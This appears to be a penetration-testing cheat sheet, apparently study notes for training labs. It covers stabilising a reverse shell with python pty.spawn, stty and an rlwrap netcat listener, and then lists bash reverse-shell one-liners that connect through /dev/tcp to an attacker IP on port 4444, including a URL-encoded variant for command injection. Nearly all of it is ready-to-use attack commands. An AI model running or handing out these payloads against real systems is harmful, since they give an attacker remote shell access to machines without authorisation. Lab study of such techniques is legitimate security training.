

# Upgrade/Stabilize Shell

```powershell
# ---------------- Test -----------------------
[ -t 0 ] && [ -t 1 ] && [[ $- == *i* ]] && echo "Good shell" || echo "Need pty"

# -----------Technique 1 (for linux)-------------

python -c 'import pty;pty.spawn("/bin/bash")' #might need to select the python version (python,python2,python3)
# or spawn a /bin/sh:
python3 -c 'import pty; pty.spawn("/bin/sh")'


export TERM=xterm #gives us access to term commands such as 'clear'
CTRL+Z #background the session 
#in your own terminal:
stty raw -echo; fg #turns of our own terminal echo, then forgrounds the process


# ----------- Technique 2 (best for windows) ---------------
rlwrap nc -lvnp <port>
# This might still need this to fully stabilise the shell: 
CTRL=Z
stty raw -echo; fg 

# ------------ Technique 3 (SOCAT) ----------------------
https://tryhackme.com/room/introtoshells
```



# Bash shells

```powershell

# 1: If the executing system executes the command in Bash directly:
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

# 2. If the system executes the command in Bourne Shell (sh), add bash -c to run it in bash:
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

# 3. If encoding is needed:
# use urlencode tool: urlencode "string"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

```